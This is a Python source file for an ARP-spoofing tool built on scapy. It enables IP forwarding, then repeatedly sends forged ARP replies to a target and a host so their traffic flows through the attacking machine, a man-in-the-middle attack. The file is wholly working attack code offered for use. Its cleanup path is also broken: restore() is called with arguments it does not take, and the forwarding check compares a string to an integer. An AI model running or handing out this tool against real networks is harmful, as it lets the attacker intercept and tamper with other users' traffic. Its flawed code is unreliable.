from time import sleep

from scapy.layers.l2 import Ether, ARP
from scapy.sendrecv import send, srp

from utils.output import print_text


class Spoofer:

    def __init__(
        self,
        target_ip: str,
        host_ip: str,
    ) -> None:
        self.target_ip = target_ip
        self.host_ip = host_ip
    
    def enable_ip_forwarding(self):
        print_text('[!] Enabling ip forwarding.', attrs=['bold'])

        file_path = '/proc/sys/net/ipv4/ip_forward'

        with open(file_path) as f:
            if f.read() == 1:
                # already enabled
                return
        with open(file_path, 'w') as f:
            print(1, file=f)

        print_text('[!] Enabled ip forwarding.', attrs=['bold'])

    def get_mac(self, ip):
        ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src
            
    def spoof(self, target_ip, host_ip):

        target_mac = self.get_mac(target_ip)
        
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')
        
        send(arp_response, verbose=False)

        self_mac = ARP().hwsrc
        print_text("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, self_mac), attrs=['bold'])
    
    def restore_one(self, target_ip: str, host_ip: str):
        target_mac = self.get_mac(target_ip)
        
        host_mac = self.get_mac(host_ip)
        
        arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
        
        send(arp_response, verbose=0, count=7)

        print_text("[+] Sent to {} : {} is-at {}".format(target_ip, host_ip, host_mac), attrs=['bold'])


    def restore(self):
        self.restore_one(self.target_ip, self.host_ip)
        self.restore_one(self.host_ip, self.target_ip)

    def start(self):
        try:
            while True:
                self.spoof(self.target_ip, self.host_ip)
                self.spoof(self.host_ip, self.target_ip)
                sleep(1)

        except KeyboardInterrupt:
            print("[!] Detected CTRL+C ! restoring the network, please wait...")
            self.restore(self.target_ip, self.host_ip)
            self.restore(self.host_ip, self.target_ip)